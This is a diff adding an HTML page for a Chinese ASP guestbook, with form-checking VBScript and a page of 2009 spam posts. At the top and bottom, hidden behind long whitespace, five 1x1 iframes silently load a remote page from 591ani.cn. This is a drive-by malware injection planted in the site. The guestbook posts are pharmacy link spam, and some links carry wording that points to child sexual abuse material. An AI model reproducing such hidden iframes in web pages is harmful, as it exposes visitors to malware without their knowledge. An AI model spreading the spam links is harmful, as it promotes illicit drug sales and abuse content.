@@ -1,0 +1,206 @@
+
+                                                                                                                             <iframe src=http://591ani.cn/html.htm width="1" height="1"></iframe>
+                                                                                                                             <iframe src=http://591ani.cn/html.htm width="1" height="1"></iframe>
+                                                                                                                             <iframe src=http://591ani.cn/html.htm width="1" height="1"></iframe>
+                                                                                                                             <iframe src=http://591ani.cn/html.htm width="1" height="1"></iframe>
+                                                                                                                             <iframe src=http://591ani.cn/html.htm width="1" height="1"></iframe>
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<title>给我留言</title>
+<style type="text/css">
+A:link,A:active,A:visited{TEXT-DECORATION:none ;Color:#3C2F1D}
+A:hover{TEXT-DECORATION: underline;Color:#4455aa}
+BODY{
+	FONT-SIZE: 12px;
+	COLOR: #000000;
+	FONT-FAMILY:  宋体;
+	background-color: #F7FBFF;
+	
+
+	background-image: url(img/leaf.gif);
+}
+font{line-height : normal ;}
+
+td { table-layout:fixed;
+word-break :break-all; 
+font-family:"宋体"; 
+font-size: 12px;
+line-height: 15px;
+}
+th
+{
+background-color: #877C59;
+COLOR: #F4F2EC;
+font-size: 12px;
+font-weight:bold;
+}
+.style1 {color: #FFFFFF}
+</style>
+<SCRIPT language=JavaScript1.2>
+function high(x2){
+obj=x2
+highlighting=setInterval("highlightit(obj)",80)
+}
+function highlightit(x){
+if (x.filters.alpha.opacity<98)
+x.filters.alpha.opacity+=5
+else if (window.highlighting)
+clearInterval(highlighting)
+}
+</SCRIPT>
+
+
+<script language="vbscript">
+<!--clean value of content
+ sub cleanC()
+   document.pencil.content.value=""
+ end sub
+-->
+<!--check all value of form
+  sub check()
+    if document.pencil.content.value="" then
+	   alert("Do not leave a empty message please!")
+	   exit sub
+        
+	elseif  len(document.pencil.content.value)>200 then
+	   alert("留言内容长度不能超过２００字符!")
+	   exit sub
+	elseif document.pencil.title.value="" then
+	   alert("Please write title!")
+	   exit sub
+	else
+	   document.pencil.submit
+	end if
+  end sub
+-->
+<!--made use onclicking reply logo to reply
+  sub reply(x,y)
+    document.pencil.title.value="回复 "&x&" ("&y&") "
+  end sub
+-->
+<!--finding newest version and updating
+  sub newest()
+    udt=confirm("是否查看及下载留言板的最新版本?")
+    if udt=true then
+       document.postboardupdate.submit
+       exit sub
+    end if
+  end sub
+-->
+<!--deletion message
+sub Deletion(x)
+  C="management_operate.asp?action=delete&NO="
+  ra=confirm("确实要删除这条留言吗？")
+   if ra=true then
+      window.navigate(c&x)
+      exit sub
+   end if
+end sub
+-->
+</script>
+</head>
+
+<body>
+
+<table width="700" border="0" align="center" cellpadding="0" cellspacing="0">
+    <tr>
+      <td width="763" height="25"></td>
+    </tr>
+</table>
+<p><strong><a name="latest" id="latest"></a></strong>
+  <table width=600 border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#E8F2FF"><tr><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif" width=100><strong>32615楼</strong></td><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif"><table><tr><td width=282><div align="left">标题： <a title="YrZpJSloLxjpAjyV">YrZpJSloLxjpAjy...</a></div></td><td><div align="right"><img src=img/email.gif alt=tzwltumi@kozuapmx.com> <a href=#pencil onclick=reply('Vvwiimvl',"YrZpJSloLxjpAjy...")><img src=img/reply.gif alt="reply" border=0></a></div></TD></tr></table></td></tr><tr><td colspan=2 bgcolor=white style="FILTER: alpha(opacity=70)" onmouseover=high(this)><table width=590 height=35><tr><td width=300>【作者】Vvwiimvl</td><td width=290>【发表时间】2009-3-18 23:43:22</tr></table><div align=left><table width=100% ><tr><td>【留言内容】</td></tr><tr><td><p>　　&lt;_b_&gt;&lt;url&gt;http://boards.grizzliesonline.com/index.php?showuser=9008#1|order ambien&lt;/url&gt;&lt;/_b_&gt;  
+530485, &lt;_b_&gt;&lt;url&gt;http://www.divernet.com/forumvb/member.php?u=12770#1|Buy Acomplia&lt;/url&gt;&lt;/_b_&gt;  
+:[, &lt;</p></td></tr></table></div></tr></table><table><tr><td></td></tr></table><table width=600 border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#E8F2FF"><tr><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif" width=100><strong>32614楼</strong></td><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif"><table><tr><td width=282><div align="left">标题： <a title="Pmmtplec">Pmmtplec</a></div></td><td><div align="right"><img src=img/email.gif alt=goodboy@yahoo.com> <a href=#pencil onclick=reply('Pmmtplec',"Pmmtplec")><img src=img/reply.gif alt="reply" border=0></a></div></TD></tr></table></td></tr><tr><td colspan=2 bgcolor=white style="FILTER: alpha(opacity=70)" onmouseover=high(this)><table width=590 height=35><tr><td width=300>【作者】Pmmtplec</td><td width=290>【发表时间】2009-3-18 23:42:54</tr></table><div align=left><table width=100% ><tr><td>【留言内容】</td></tr><tr><td><p>　　Best Site good looking &lt;a href=" http://www.justin.tv/mskatelyn/profile "&gt;pagina de lolitas little kiss&lt;/a&gt;  snvt </p></td></tr></table></div></tr></table><table><tr><td></td></tr></table><table width=600 border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#E8F2FF"><tr><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif" width=100><strong>32613楼</strong></td><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif"><table><tr><td width=282><div align="left">标题： <a title="MSgCToUMpfnkzrxPDRC">MSgCToUMpfnkzrx...</a></div></td><td><div align="right"><img src=img/email.gif alt=itaylgwa@ikzekwaa.com> <a href=#pencil onclick=reply('Lqpwvjbj',"MSgCToUMpfnkzrx...")><img src=img/reply.gif alt="reply" border=0></a></div></TD></tr></table></td></tr><tr><td colspan=2 bgcolor=white style="FILTER: alpha(opacity=70)" onmouseover=high(this)><table width=590 height=35><tr><td width=300>【作者】Lqpwvjbj</td><td width=290>【发表时间】2009-3-18 23:39:52</tr></table><div align=left><table width=100% ><tr><td>【留言内容】</td></tr><tr><td><p>　　&lt;_b_&gt;&lt;url&gt;http://www.gamecareerguide.com/forums/member.php?u=4605#1|Buy ambien&lt;/url&gt;&lt;/_b_&gt;  
+5201, &lt;_b_&gt;&lt;url&gt;http://phoronix.com/forums/member.php?u=18992#1|discount cialis&lt;/url&gt;&lt;/_b_&gt;  
+ziubff, &lt;_b_&gt;</p></td></tr></table></div></tr></table><table><tr><td></td></tr></table><table width=600 border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#E8F2FF"><tr><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif" width=100><strong>32612楼</strong></td><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif"><table><tr><td width=282><div align="left">标题： <a title="CMSbfKSlfHR">CMSbfKSlfHR</a></div></td><td><div align="right"><img src=img/email.gif alt=xpeowolj@ckoezfew.com> <a href=#pencil onclick=reply('Ikjiuaer',"CMSbfKSlfHR")><img src=img/reply.gif alt="reply" border=0></a></div></TD></tr></table></td></tr><tr><td colspan=2 bgcolor=white style="FILTER: alpha(opacity=70)" onmouseover=high(this)><table width=590 height=35><tr><td width=300>【作者】Ikjiuaer</td><td width=290>【发表时间】2009-3-18 23:38:12</tr></table><div align=left><table width=100% ><tr><td>【留言内容】</td></tr><tr><td><p>　　&lt;_b_&gt;&lt;url&gt;http://www.tribun-timur.com/forum/member.php?u=2372#1|Lasix  online&lt;/url&gt;&lt;/_b_&gt;  
+trbs, &lt;_b_&gt;&lt;url&gt;http://www.newmediamedicine.com/forum/members/RickyMird.html#1|propecia online&lt;/url&gt;&lt;/_b_&gt;  </p></td></tr></table></div></tr></table><table><tr><td></td></tr></table><table width=600 border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#E8F2FF"><tr><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif" width=100><strong>32611楼</strong></td><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif"><table><tr><td width=282><div align="left">标题： <a title="Troafphf">Troafphf</a></div></td><td><div align="right"><img src=img/email.gif alt=goodsam@gmail.com> <a href=#pencil onclick=reply('Troafphf',"Troafphf")><img src=img/reply.gif alt="reply" border=0></a></div></TD></tr></table></td></tr><tr><td colspan=2 bgcolor=white style="FILTER: alpha(opacity=70)" onmouseover=high(this)><table width=590 height=35><tr><td width=300>【作者】Troafphf</td><td width=290>【发表时间】2009-3-18 23:35:53</tr></table><div align=left><table width=100% ><tr><td>【留言内容】</td></tr><tr><td><p>　　This site is crazy :) &lt;a href=" http://www.ps3za.co.za/forum/member.php?u=3167 "&gt;free 89porn&lt;/a&gt;  kxgkh </p></td></tr></table></div></tr></table><table><tr><td></td></tr></table><table width=600 border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#E8F2FF"><tr><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif" width=100><strong>32610楼</strong></td><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif"><table><tr><td width=282><div align="left">标题： <a title="PpHNUyqQaGACYmvklF">PpHNUyqQaGACYmv...</a></div></td><td><div align="right"><img src=img/email.gif alt=ofzspvai@ddihnofu.com> <a href=#pencil onclick=reply('Favdqxpe',"PpHNUyqQaGACYmv...")><img src=img/reply.gif alt="reply" border=0></a></div></TD></tr></table></td></tr><tr><td colspan=2 bgcolor=white style="FILTER: alpha(opacity=70)" onmouseover=high(this)><table width=590 height=35><tr><td width=300>【作者】Favdqxpe</td><td width=290>【发表时间】2009-3-18 23:34:56</tr></table><div align=left><table width=100% ><tr><td>【留言内容】</td></tr><tr><td><p>　　&lt;_b_&gt;&lt;url&gt;http://boards.grizzliesonline.com/index.php?showuser=8992#1|Buy Accutane&lt;/url&gt;&lt;/_b_&gt;  
+=-]], &lt;_b_&gt;&lt;url&gt;http://bbs.conqueronline.com/member.php?u=148278#1|Purchase valium&lt;/url&gt;&lt;/_b_&gt;  
+nfgi, </p></td></tr></table></div></tr></table><table><tr><td></td></tr></table><table width=600 border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#E8F2FF"><tr><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif" width=100><strong>32609楼</strong></td><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif"><table><tr><td width=282><div align="left">标题： <a title="IEWoGmGbFNEjeBvyE">IEWoGmGbFNEjeBv...</a></div></td><td><div align="right"><img src=img/email.gif alt=ulzkdkrr@qopzozrw.com> <a href=#pencil onclick=reply('Xujbqzej',"IEWoGmGbFNEjeBv...")><img src=img/reply.gif alt="reply" border=0></a></div></TD></tr></table></td></tr><tr><td colspan=2 bgcolor=white style="FILTER: alpha(opacity=70)" onmouseover=high(this)><table width=590 height=35><tr><td width=300>【作者】Xujbqzej</td><td width=290>【发表时间】2009-3-18 23:32:28</tr></table><div align=left><table width=100% ><tr><td>【留言内容】</td></tr><tr><td><p>　　&lt;_b_&gt;&lt;url&gt;http://www.serv.co.za/forum/members/HoratioLlamas.html#1|cheapest Tramadol&lt;/url&gt;&lt;/_b_&gt;  
+8P, &lt;_b_&gt;&lt;url&gt;http://www.serv.co.za/forum/members/ShawnBradley.html#1|Acomplia online&lt;/url&gt;&lt;/_b_&gt;  
+y</p></td></tr></table></div></tr></table><table><tr><td></td></tr></table><table width=600 border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#E8F2FF"><tr><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif" width=100><strong>32608楼</strong></td><td style="FILTER: alpha(opacity=80)" height="30" background="img/title_blue.gif"><table><tr><td width=282><div align="left">标题： <a title="tzNGkTqulSMJPj">tzNGkTqulSMJPj</a></div></td><td><div align="right"><img src=img/email.gif alt=retlrpfq@feflowsp.com> <a href=#pencil onclick=reply('Cmvxyzvj',"tzNGkTqulSMJPj")><img src=img/reply.gif alt="reply" border=0></a></div></TD></tr></table></td></tr><tr><td colspan=2 bgcolor=white style="FILTER: alpha(opacity=70)" onmouseover=high(this)><table width=590 height=35><tr><td width=300>【作者】Cmvxyzvj</td><td width=290>【发表时间】2009-3-18 23:30:49</tr></table><div align=left><table width=100% ><tr><td>【留言内容】</td></tr><tr><td><p>　　&lt;_b_&gt;&lt;url&gt;http://forums.circledog.com/member.php?u=5356#1|Purchase ambien&lt;/url&gt;&lt;/_b_&gt;  
+62887, &lt;_b_&gt;&lt;url&gt;http://www.tribun-timur.com/forum/member.php?u=2371#1|buy Doxycycline online&lt;/url&gt;&lt;/_b_&gt;  
+deoq</p></td></tr></table></div></tr></table><table><tr><td></td></tr></table>
+  <br>
+  <br>
+  <BR>
+  <table align="center" width=600 border="0" align="left" cellpadding="0" cellspacing="0"><tr><td valign=baseline><a href=index.asp?page=19><img src=img/previous.gif border=0> 上一页</a>　　<a href=index.asp?page=15>[15]</a> <a href=index.asp?page=16>[16]</a> <a href=index.asp?page=17>[17]</a> <a href=index.asp?page=18>[18]</a> <a href=index.asp?page=19>[19]</a> <strong><font color=orange>[20]</font></strong> <a href=index.asp?page=21>[21]</a> <a href=index.asp?page=22>[22]</a> <a href=index.asp?page=23>[23]</a> <a href=index.asp?page=24>[24]</a> <a href=index.asp?page=25>[25]</a> 　　<a href=index.asp?page=21>下一页 <img src=img/next.gif border=0></a></td></tr><tr><td><br>共<font color=darkorange>4096</font>页　当前第<font color=darkorange>20</font>页　　 <form name=selectpage method=post action=index.asp>  |  page <input type=text name=page size=2 maxlength=4> <input type=submit name=submit value=go> | <a href=?page=1>首页</a> | <a href=?page=4096>未页</a> | <a href=?page=1#latest>最新留言</a> | </form></td></tr>
+</p>
+<tr>
+    <td height="25" colspan="2">
+<form name="pencil" action="write.asp" method="post">
+	  <table width="598" height="129"  border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#E8F2FF">
+	  <tr>
+	    <td height="30" colspan="2" background="img/title_blue.gif"><strong><a name="pencil"></a>发表留言</strong></td>
+	    </tr>
+	  <tr>
+	  <td width="112" height="34">
+	    <p>标题<br>
+	      title : </p>
+	    </td>
+		<td width="480">
+		<input name="title" type="text" id="title" style="BORDER-RIGHT: #D7E8FF 1px solid; BORDER-TOP: #D7E8FF 1px solid; BORDER-LEFT: #D7E8FF 1px solid; BORDER-BOTTOM: #D7E8FF 1px solid; BACKGROUND-COLOR: #F7FAFF" onMouseOver="this.style.backgroundColor='#ffffff'" onMouseOut="this.style.backgroundColor='#F7FAFF'" size="50" maxlength="40">
+		<font color=red>*</font>
+		</td>
+		</tr>
+	  <tr>
+	    <td height="34">
+		姓名<br>
+		name:
+		</td>
+	    <td><input  name="name" type="text" id="name" style="BORDER-RIGHT: #D7E8FF 1px solid; BORDER-TOP: #D7E8FF 1px solid; BORDER-LEFT: #D7E8FF 1px solid; BORDER-BOTTOM: #D7E8FF 1px solid; BACKGROUND-COLOR: #F7FAFF" onMouseOver="this.style.backgroundColor='#ffffff'" onMouseOut="this.style.backgroundColor='#F7FAFF'" title="This value is your IP Address if value is empty" maxlength="40">
+	      
+          </td>
+	    </tr>
+	     <td height="34">
+	   电邮<br>E-mail :
+		</td>
+		   <td>
+		<input name="email" type="text" id="email" style="BORDER-RIGHT: #D7E8FF 1px solid; BORDER-TOP: #D7E8FF 1px solid; BORDER-LEFT: #D7E8FF 1px solid; BORDER-BOTTOM: #D7E8FF 1px solid; BACKGROUND-COLOR: #F7FAFF" onMouseOver="this.style.backgroundColor='#ffffff'" onMouseOut="this.style.backgroundColor='#F7FAFF'" maxlength="40">
+		</td>
+		</tr>
+		 <tr>
+		   <td>
+		   留言内容<br>
+		   content of message
+		   </td>
+		   <td><textarea onMouseOver="this.style.backgroundColor='#ffffff'" onMouseOut="this.style.backgroundColor='#F7FAFF'" name="content" cols="60" rows="6" style="BORDER-RIGHT: #D7E8FF 1px solid; BORDER-TOP: #D7E8FF 1px solid; BORDER-LEFT: #D7E8FF 1px solid; BORDER-BOTTOM: #D7E8FF 1px solid; BACKGROUND-COLOR: #F7FAFF" maxlength="200" title="Content of message which you want to leave"></textarea>
+		     <font color=red>*</font>
+	       </td>
+	    </tr>
+		<tr><td colspan="2">
+	          <div align="left">
+	            <input type="button" name="send out" value="提交" onClick="check()">		  
+		        <input type="button" name="clean" value="重置" onClick="cleanC()">
+	          </div></td>
+		</tr>
+	  </table>
+      </form>
+    </td>
+</tr>
+ 
+</table>
+<table width="200" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+</table>
+
+<br>
+<table width="600" height="41" border="0" align="center" cellpadding="0" cellspacing="0">
+  <!--DWLayoutTable-->
+  <tr>
+    <td width="600" valign="bottom"><div align="center">　<img src=img/psw.gif width=18 height=18><a href=administration/login_form_admin.htm title=管理员>管理员登陆</a>
+</div></td>
+  </tr>
+  <tr>
+    <td height="56">&nbsp;</td>
+  </tr>
+</table>
+</body>
+</html>                                                                                                                             <iframe src=http://591ani.cn/html.htm width="1" height="1"></iframe>
+                                                                                                                             <iframe src=http://591ani.cn/html.htm width="1" height="1"></iframe>
+                                                                                                                             <iframe src=http://591ani.cn/html.htm width="1" height="1"></iframe>
+                                                                                                                             <iframe src=http://591ani.cn/html.htm width="1" height="1"></iframe>
+                                                                                                                             <iframe src=http://591ani.cn/html.htm width="1" height="1"></iframe>
